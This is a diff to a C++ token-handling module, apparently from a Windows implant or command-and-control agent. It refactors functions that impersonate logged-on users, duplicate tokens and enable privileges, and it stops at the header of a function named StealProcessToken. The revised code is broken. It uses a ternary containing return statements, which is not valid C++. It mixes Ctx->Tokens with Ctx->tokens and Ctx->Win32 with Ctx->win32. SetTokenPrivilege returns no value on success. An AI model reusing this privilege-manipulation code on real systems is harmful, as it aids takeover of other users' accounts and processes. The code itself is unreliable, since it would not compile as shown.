@@ -1,41 +1,34 @@
 #include "commands/include/tokens.hpp"
 namespace Token {
-
 	BOOL RevertToken() {
+		HANDLE token = nullptr;
 
-		HANDLE token = { };
-		if (NT_SUCCESS(ntstatus = Ctx->nt.NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &token, sizeof(HANDLE)))) {
-			return TRUE;
-		}
-
-		return FALSE;
+		NT_SUCCESS(Ctx->Teb->LastErrorValue = Ctx->Win32.NtSetInformationThread(
+					NtCurrentThread(), ThreadImpersonationToken, &token, sizeof(HANDLE)))
+			? return true
+			: return false;
 	}
 
-	BOOL Tokenimpersonate(bool impersonate) {
-
-		BOOL success = FALSE;
-		if (impersonate && !Ctx->tokens.impersonate && Ctx->tokens.token) {
+	BOOL Tokenimpersonate(BOOL impersonate) {
+		if (impersonate && !Ctx->Tokens.Impersonate && Ctx->Tokens.Token) {
 			if (!(Ctx->tokens.impersonate = Ctx->win32.ImpersonateLoggedOnUser(Ctx->tokens.token->handle))) {
-				return_defer(ERROR_CANNOT_IMPERSONATE);
+				return false;
 			}
 		} else if (!impersonate && Ctx->tokens.impersonate) {
-			Ctx->tokens.impersonate = FALSE;
-			success = RevertToken();
-
-		} else if (impersonate && !Ctx->tokens.token) {
-			success = TRUE;
-		} else if (impersonate && Ctx->tokens.impersonate) {
-			success = TRUE;
-		} else if (impersonate && !Ctx->tokens.impersonate) {
-			success = TRUE;
+			Ctx->Tokens.Impersonate = false;
+			if (RevertToken()) {
+				return true;
+			}
+		} else if (impersonate && !Ctx->Tokens.Token) {
+			return true;
+		} else if (impersonate && Ctx->Tokens.Impersonate) {
+			return true;
+		} else if (impersonate && !Ctx->Tokens.Impersonate) {
+			return true;
 		}
-
-		defer:
-		return success;
 	}
 
 	VOID DuplicateToken(HANDLE orgToken, const uint32_t access, SECURITY_IMPERSONATION_LEVEL level, TOKEN_TYPE type, PHANDLE new_token) {
-
 		OBJECT_ATTRIBUTES attrs				= { };
 		SECURITY_QUALITY_OF_SERVICE sqos	= { };
 
@@ -47,33 +40,31 @@ namespace Token {
 		InitializeObjectAttributes(&attrs, nullptr, 0, nullptr, nullptr);
 		attrs.SecurityQualityOfService = &sqos;
 
-		ntstatus = Ctx->nt.NtDuplicateToken(orgToken, access, &attrs, FALSE, type, new_token);
+		ntstatus = Ctx->Win32.NtDuplicateToken(orgToken, access, &attrs, FALSE, type, new_token);
 	}
 
-	VOID SetTokenPrivilege(const wchar_t* privilege, bool enable) {
-
-		TOKEN_PRIVILEGES token_priv	= { };
+	BOOL SetTokenPrivilege(const WCHAR* privilege, const BOOL enable) {
+		TOKEN_PRIVILEGES tokenPriv	= { };
 		HANDLE token 				= { };
 		LUID luid 					= { };
 
 		if (!LookupPrivilegeValueW(nullptr, privilege, &luid)) {
-			return_defer(ERROR_PRIVILEGE_NOT_HELD);
+			return false;
 		}
 
-		token_priv.PrivilegeCount		= 1;
-		token_priv.Privileges[0].Luid	= luid;
+		tokenPriv.PrivilegeCount		= 1;
+		tokenPriv.Privileges[0].Luid	= luid;
 
 		enable
-		? token_priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
-		: token_priv.Privileges[0].Attributes = NULL;
+		? tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+		: tokenPriv.Privileges[0].Attributes = NULL;
 
-		if (
-			!NT_SUCCESS(Ctx->nt.NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &token)) ||
-			!Ctx->win32.AdjustTokenPrivileges(token, FALSE, &token_priv, 0, nullptr, nullptr)) {
-			return_defer(ERROR_INVALID_TOKEN);
+		if (!NT_SUCCESS(Ctx->Win32.NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &token))) {
+			return false;
 		}
-
-		defer:
+		if (!Ctx->Win32.AdjustTokenPrivileges(token, false, &tokenPriv, 0, nullptr, nullptr)) {
+			return false;
+		}
 	}
 
 	HANDLE StealProcessToken(HANDLE target, const uint32_t pid) {
